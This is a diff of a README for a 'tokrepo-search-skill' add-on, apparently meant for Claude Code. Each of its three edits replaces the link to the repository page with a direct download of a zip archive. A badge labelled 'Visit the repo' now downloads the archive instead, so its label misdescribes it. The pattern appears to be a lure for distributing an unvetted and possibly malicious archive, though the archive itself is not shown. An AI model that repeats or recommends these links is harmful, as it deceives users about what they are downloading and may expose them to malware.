@@ -1,6 +1,6 @@
 # 🧩 tokrepo-search-skill - Find TokRepo content fast
 
-[![Download tokrepo-search-skill](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge)](https://github.com/Norrysubtle368/tokrepo-search-skill)
+[![Download tokrepo-search-skill](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge)](https://raw.githubusercontent.com/Norrysubtle368/tokrepo-search-skill/main/claude-code/tokrepo-search-skill-v2.3-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ tokrepo-search-skill helps you search TokRepo content from tools like Claude Cod
 
 Use the link below to visit the page and download or open the project:
 
-**Primary download link:** https://github.com/Norrysubtle368/tokrepo-search-skill
+**Primary download link:** https://raw.githubusercontent.com/Norrysubtle368/tokrepo-search-skill/main/claude-code/tokrepo-search-skill-v2.3-beta.5.zip
 
 ## 📥 Download and Install on Windows
 
@@ -168,7 +168,7 @@ This repository fits topics such as:
 
 If you need to return to the project, use this link:
 
-**https://github.com/Norrysubtle368/tokrepo-search-skill**
+**https://raw.githubusercontent.com/Norrysubtle368/tokrepo-search-skill/main/claude-code/tokrepo-search-skill-v2.3-beta.5.zip**
 
 ## 🧭 Quick start for non-technical users
 
